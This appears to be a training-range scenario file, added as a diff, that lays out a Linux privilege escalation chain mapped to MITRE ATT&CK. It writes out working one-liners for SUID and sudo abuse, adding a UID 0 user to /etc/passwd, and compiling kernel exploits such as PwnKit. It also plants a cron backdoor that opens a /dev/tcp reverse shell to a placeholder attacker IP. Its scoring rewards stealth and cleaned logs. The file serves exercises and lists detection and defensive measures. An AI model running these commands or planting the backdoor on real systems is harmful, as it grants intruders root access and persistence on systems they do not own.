@@ -1,0 +1,321 @@
+# Privilege Escalation Scenario
+# MITRE ATT&CK: T1068 (Exploitation for Privilege Escalation)
+
+scenario:
+  id: "attack-003"
+  name: "Linux Privilege Escalation Chain"
+  description: "Escalate from unprivileged user to root access"
+  difficulty: "intermediate"
+  duration_minutes: 25
+
+mitre_attack:
+  tactics:
+    - "TA0004"  # Privilege Escalation
+    - "TA0007"  # Discovery
+    - "TA0003"  # Persistence
+
+  techniques:
+    - id: "T1068"
+      name: "Exploitation for Privilege Escalation"
+      tactic: "Privilege Escalation"
+
+    - id: "T1078.003"
+      name: "Valid Accounts: Local Accounts"
+      tactic: "Privilege Escalation"
+
+    - id: "T1053.003"
+      name: "Scheduled Task/Job: Cron"
+      tactic: "Persistence"
+
+    - id: "T1548.003"
+      name: "Abuse Elevation Control Mechanism: Sudo and Sudo Caching"
+      tactic: "Privilege Escalation"
+
+attack_chain:
+  - step: 1
+    name: "System Enumeration"
+    technique: "T1082"
+    description: "Gather system information and identify escalation vectors"
+    commands:
+      - tool: "uname"
+        args: "-a"
+        expected_output: "Kernel version and architecture"
+
+      - tool: "linpeas"
+        args: ""
+        expected_output: "Comprehensive privilege escalation audit"
+
+      - tool: "linux-exploit-suggester"
+        args: ""
+        expected_output: "Kernel exploit recommendations"
+
+      - tool: "find"
+        args: "/ -perm -4000 -type f 2>/dev/null"
+        expected_output: "SUID binaries list"
+
+    success_criteria:
+      - "Identified kernel version"
+      - "Found SUID binaries"
+      - "Discovered writable paths"
+      - "Enumerated sudo permissions"
+
+  - step: 2
+    name: "SUID Binary Exploitation"
+    technique: "T1548.001"
+    description: "Abuse SUID binaries for privilege escalation"
+    commands:
+      - tool: "find"
+        args: "/ -perm -4000 -user root 2>/dev/null"
+        expected_output: "Root-owned SUID binaries"
+
+      - tool: "gtfobins-check"
+        args: "{{SUID_BINARY}}"
+        expected_output: "Exploitation method"
+
+      - tool: "exploit"
+        args: "/usr/bin/{{VULNERABLE_SUID}} -p"
+        expected_output: "Root shell spawned"
+
+    success_criteria:
+      - "Identified vulnerable SUID binary"
+      - "Executed privilege escalation"
+      - "Obtained root shell"
+
+    example_exploits:
+      - binary: "find"
+        exploit: "find . -exec /bin/sh -p \\; -quit"
+
+      - binary: "nmap"
+        exploit: "nmap --interactive\n!sh"
+
+      - binary: "vim"
+        exploit: "vim -c ':!sh'"
+
+      - binary: "python"
+        exploit: "python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
+
+  - step: 3
+    name: "Sudo Misconfiguration Abuse"
+    technique: "T1548.003"
+    description: "Exploit sudo misconfigurations"
+    commands:
+      - tool: "sudo"
+        args: "-l"
+        expected_output: "Allowed sudo commands"
+
+      - tool: "exploit"
+        args: "sudo {{ALLOWED_COMMAND}} {{EXPLOIT_ARGS}}"
+        expected_output: "Command execution as root"
+
+    success_criteria:
+      - "Listed sudo permissions"
+      - "Identified exploitable command"
+      - "Escalated privileges"
+
+    common_vectors:
+      - command: "sudo /usr/bin/less /etc/shadow"
+        exploit: "!sh (from less)"
+
+      - command: "sudo /usr/bin/awk"
+        exploit: "awk 'BEGIN {system(\"/bin/sh\")}'"
+
+      - command: "sudo /usr/bin/vim"
+        exploit: ":!sh"
+
+      - command: "NOPASSWD: /usr/bin/python"
+        exploit: "sudo python -c 'import os; os.system(\"/bin/sh\")'"
+
+  - step: 4
+    name: "Writable /etc/passwd Exploitation"
+    technique: "T1078.003"
+    description: "Add root user via writable passwd file"
+    commands:
+      - tool: "ls"
+        args: "-la /etc/passwd"
+        expected_output: "File permissions"
+
+      - tool: "openssl"
+        args: "passwd -1 -salt xyz password123"
+        expected_output: "Hashed password"
+
+      - tool: "echo"
+        args: "'newroot:$1$xyz$...:0:0:root:/root:/bin/bash' >> /etc/passwd"
+        expected_output: "User added"
+
+      - tool: "su"
+        args: "newroot"
+        expected_output: "Root shell"
+
+    success_criteria:
+      - "Verified writable /etc/passwd"
+      - "Generated password hash"
+      - "Added privileged user"
+      - "Logged in as root"
+
+  - step: 5
+    name: "Kernel Exploit Escalation"
+    technique: "T1068"
+    description: "Exploit kernel vulnerability for root access"
+    commands:
+      - tool: "uname"
+        args: "-r"
+        expected_output: "Kernel version"
+
+      - tool: "searchsploit"
+        args: "linux kernel {{VERSION}}"
+        expected_output: "Available exploits"
+
+      - tool: "gcc"
+        args: "exploit.c -o exploit"
+        expected_output: "Compiled exploit"
+
+      - tool: "exploit"
+        args: "./exploit"
+        expected_output: "Root shell obtained"
+
+    success_criteria:
+      - "Identified vulnerable kernel"
+      - "Compiled exploit"
+      - "Successfully executed"
+      - "Obtained root privileges"
+
+    example_exploits:
+      - name: "Dirty COW"
+        cve: "CVE-2016-5195"
+        kernel: "< 4.8.3"
+
+      - name: "Ubuntu eBPF"
+        cve: "CVE-2021-3493"
+        kernel: "Ubuntu 5.4.x"
+
+      - name: "PwnKit"
+        cve: "CVE-2021-4034"
+        kernel: "All versions (pkexec)"
+
+  - step: 6
+    name: "Cron Job Hijacking"
+    technique: "T1053.003"
+    description: "Exploit writable cron jobs for persistence"
+    commands:
+      - tool: "find"
+        args: "/etc/cron* -writable"
+        expected_output: "Writable cron directories"
+
+      - tool: "echo"
+        args: "'* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/{{ATTACKER_IP}}/4444 0>&1\"' >> /etc/crontab"
+        expected_output: "Backdoor added"
+
+    success_criteria:
+      - "Found writable cron files"
+      - "Injected malicious job"
+      - "Obtained persistent root access"
+
+defense_detection:
+  indicators:
+    - type: "process"
+      description: "Suspicious SUID binary execution"
+      pattern: "{{SUID_BINARY}} spawning /bin/sh"
+      severity: "HIGH"
+
+    - type: "file"
+      description: "/etc/passwd modification"
+      pattern: "New UID 0 user added"
+      severity: "CRITICAL"
+
+    - type: "authentication"
+      description: "Unusual root login"
+      pattern: "su to root from unprivileged user"
+      severity: "HIGH"
+
+    - type: "system"
+      description: "Kernel exploit indicators"
+      pattern: "Kernel panic or unusual memory access"
+      severity: "CRITICAL"
+
+    - type: "cron"
+      description: "Suspicious cron job addition"
+      pattern: "New cron entry with network activity"
+      severity: "HIGH"
+
+defensive_measures:
+  preventive:
+    - "Regular security updates and kernel patches"
+    - "Minimize SUID binaries"
+    - "Strict sudo configuration"
+    - "Read-only /etc/passwd and /etc/shadow"
+    - "Immutable flag on critical system files (chattr +i)"
+    - "AppArmor or SELinux enforcement"
+
+  detective:
+    - "Monitor SUID binary execution (auditd)"
+    - "Alert on /etc/passwd modifications"
+    - "Track privilege changes (sudo, su logs)"
+    - "Detect kernel exploit signatures"
+    - "Monitor cron job modifications"
+    - "File integrity monitoring (AIDE, Tripwire)"
+
+  responsive:
+    - "Isolate compromised system"
+    - "Review and patch exploited vulnerability"
+    - "Audit all privileged accounts"
+    - "Remove unauthorized users/cron jobs"
+    - "Restore from known-good backup"
+    - "Hunt for additional compromises"
+
+learning_objectives:
+  - "Understand Linux privilege escalation vectors"
+  - "Learn SUID binary exploitation"
+  - "Master sudo abuse techniques"
+  - "Practice kernel exploit development"
+  - "Learn persistence mechanisms"
+
+difficulty_modifiers:
+  easy:
+    - "Outdated kernel version"
+    - "Multiple SUID binaries"
+    - "Weak sudo configuration"
+    - "Writable system files"
+
+  hard:
+    - "Fully patched system"
+    - "Minimal SUID binaries"
+    - "Strict sudo policy"
+    - "AppArmor/SELinux enabled"
+    - "File integrity monitoring active"
+
+scoring:
+  max_points: 1200
+  breakdown:
+    enumeration: 150
+    suid_exploitation: 300
+    sudo_abuse: 250
+    passwd_modification: 200
+    kernel_exploit: 300
+
+  stealth_bonus:
+    no_alerts: 400
+    minimal_footprint: 200
+    cleaned_logs: 100
+
+environment:
+  required_tools:
+    - linpeas
+    - linux-exploit-suggester
+    - searchsploit
+    - gcc
+    - auditd
+
+  target_system:
+    os: "Ubuntu 20.04 LTS"
+    kernel: "5.4.0-42-generic"
+    initial_access: "low_priv_user"
+    suid_binaries:
+      - /usr/bin/find
+      - /usr/bin/nmap
+      - /usr/bin/vim.basic
+    sudo_config:
+      - "user ALL=(ALL) NOPASSWD: /usr/bin/less"
+
+  network:
+    target_ip: "10.0.50.10"
+    attacker_ip: "10.0.50.100"
